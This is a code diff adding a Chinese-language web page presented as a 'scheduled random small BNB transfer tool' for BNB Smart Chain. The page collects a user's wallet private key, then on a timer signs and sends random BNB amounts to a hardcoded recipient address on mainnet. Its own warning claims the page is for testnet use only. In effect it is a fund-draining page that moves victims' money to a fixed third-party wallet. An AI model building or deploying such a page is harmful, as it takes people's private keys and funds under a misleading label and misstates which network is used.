@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BSC 定时随机小额转账工具</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            background: #0b0e17; 
+            color: #e6e6e6; 
+            line-height: 1.6; 
+            min-height: 100vh; 
+            padding: 30px 20px;
+        }
+        .container { 
+            max-width: 540px; 
+            margin: 0 auto; 
+        }
+        h1 { 
+            text-align: center; 
+            color: #ffe600; 
+            margin-bottom: 8px; 
+            font-size: 38px; 
+        }
+        .subtitle { 
+            text-align: center; 
+            color: #9ca3af; 
+            margin-bottom: 40px; 
+            font-size: 17px; 
+        }
+        .section { 
+            background: #141721; 
+            border: 1px solid #252932; 
+            border-radius: 12px; 
+            padding: 28px; 
+            margin-bottom: 40px; 
+        }
+        .form-group { 
+            margin-bottom: 24px; 
+        }
+        .form-group label { 
+            display: block; 
+            margin-bottom: 10px; 
+            color: #c9d1d9; 
+            font-size: 16px; 
+        }
+        .form-group input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            background: #1f2633; 
+            border: 1px solid #252932; 
+            border-radius: 8px; 
+            color: white; 
+            font-size: 16px; 
+            font-family: inherit; 
+        }
+        .range-group { 
+            display: flex; 
+            gap: 16px; 
+            align-items: center; 
+        }
+        .range-group input { 
+            flex: 1; 
+        }
+        .btn { 
+            width: 100%; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: all .2s; 
+        }
+        .start-btn { 
+            background: #22c55e; 
+            color: white; 
+        }
+        .start-btn:hover:not(:disabled) { 
+            background: #16a34a; 
+        }
+        .stop-btn { 
+            background: #ef4444; 
+            color: white; 
+            margin-top: 12px; 
+        }
+        .stop-btn:hover:not(:disabled) { 
+            background: #dc2626; 
+        }
+        .btn:disabled { 
+            background: #4e5969 !important; 
+            cursor: not-allowed; 
+        }
+        #status { 
+            margin-top: 20px; 
+            text-align: center; 
+            min-height: 60px; 
+            color: #9ca3af; 
+            font-size: 15px; 
+        }
+        .warning { 
+            color: #ff6b6b; 
+            font-weight: bold; 
+            text-align: center; 
+            margin: 16px 0 24px; 
+            font-size: 15px; 
+            line-height: 1.4; 
+        }
+        .footer { 
+            text-align: center; 
+            color: #4e5969; 
+            font-size: 13px; 
+            margin-top: 60px; 
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>BSC 定时打狙</h1>
+        <div class="subtitle">向指定地址随机小额转账 BNB</div>
+
+        <div class="section">
+            <div class="warning">
+                极度危险警告！<br>
+                在网页输入私钥几乎100%会被窃取！<br>
+                仅限测试环境/测试网使用，切勿使用真实资金！
+            </div>
+
+            <div class="form-group">
+                <label>私钥（0x 开头，64位十六进制）</label>
+                <input id="privateKey" type="password" placeholder="0x...">
+            </div>
+
+            <div class="form-group">
+                <label>间隔时间（秒）</label>
+                <input id="intervalSeconds" type="number" min="10" max="1800" value="60" step="10">
+            </div>
+
+            <div class="form-group">
+                <label>每次随机转账金额范围 (BNB)</label>
+                <div class="range-group">
+                    <input id="minBnb" type="number" step="0.000001" min="0.000001" value="0.0001" placeholder="最小">
+                    <span style="color:#9ca3af; font-size:18px;">~</span>
+                    <input id="maxBnb" type="number" step="0.000001" min="0.000001" value="0.0002" placeholder="最大">
+                </div>
+            </div>
+
+            <button id="startBtn" class="btn start-btn">开始自动转账</button>
+            <button id="stopBtn" class="btn stop-btn" style="display:none;">停止转账</button>
+
+            <div id="status"></div>
+        </div>
+
+        <div class="footer">
+            目标地址：0x1401ADEf004F94aD27F13Ad7ad48de38b8F1Df2C<br>
+            BSC 主网 • 极高风险 • 仅供学习参考 • 资金安全第一
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script>
+        const TARGET_ADDRESS = '0x1401ADEf004F94aD27F13Ad7ad48de38b8F1Df2C';
+        const RPC_URL = 'https://bsc-dataseed.binance.org/';
+
+        let web3 = new Web3(RPC_URL);
+        let timerId = null;
+
+        function getRandomBetween(min, max) {
+            return Math.random() * (max - min) + min;
+        }
+
+        function updateButtonStates() {
+            const pk = document.getElementById('privateKey').value.trim();
+            const valid = pk.startsWith('0x') && pk.length === 66;
+            document.getElementById('startBtn').disabled = !valid;
+        }
+
+        document.getElementById('privateKey').oninput = updateButtonStates;
+
+        async function sendOneTx(pk, amount) {
+            const status = document.getElementById('status');
+            try {
+                const account = web3.eth.accounts.privateKeyToAccount(pk);
+                web3.eth.accounts.wallet.add(pk);
+
+                const value = web3.utils.toWei(amount.toFixed(8), 'ether');
+
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasEstimate = await web3.eth.estimateGas({
+                    from: account.address,
+                    to: TARGET_ADDRESS,
+                    value
+                });
+
+                const tx = {
+                    from: account.address,
+                    to: TARGET_ADDRESS,
+                    value,
+                    gas: Math.floor(gasEstimate * 1.2),
+                    gasPrice
+                };
+
+                const signed = await web3.eth.accounts.signTransaction(tx, pk);
+                const receipt = await web3.eth.sendSignedTransaction(signed.rawTransaction);
+
+                status.innerHTML = `成功发送 ${amount.toFixed(8)} BNB<br>` +
+                                 `<a href="https://bscscan.com/tx/${receipt.transactionHash}" target="_blank" style="color:#22c55e;">${receipt.transactionHash.slice(0,10)}...</a>`;
+            } catch (err) {
+                status.textContent = '发送失败：' + (err.message || '未知错误');
+            }
+        }
+
+        document.getElementById('startBtn').onclick = async () => {
+            const pk = document.getElementById('privateKey').value.trim();
+            if (!pk.startsWith('0x') || pk.length !== 66) return;
+
+            const min = parseFloat(document.getElementById('minBnb').value);
+            const max = parseFloat(document.getElementById('maxBnb').value);
+            const intervalMs = parseInt(document.getElementById('intervalSeconds').value) * 1000;
+
+            if (isNaN(min) || isNaN(max) || min <= 0 || max <= min) {
+                document.getElementById('status').textContent = '金额范围设置错误';
+                return;
+            }
+
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('status').textContent = '自动转账已启动...';
+
+            async function run() {
+                const amount = getRandomBetween(min, max);
+                await sendOneTx(pk, amount);
+
+                if (timerId !== null) {
+                    timerId = setTimeout(run, intervalMs);
+                }
+            }
+
+            timerId = setTimeout(run, 100); // 稍微延迟开始第一笔
+        };
+
+        document.getElementById('stopBtn').onclick = () => {
+            if (timerId !== null) {
+                clearTimeout(timerId);
+                timerId = null;
+            }
+            document.getElementById('startBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            document.getElementById('status').textContent = '已停止自动转账';
+        };
+    </script>
+</body>
+</html>
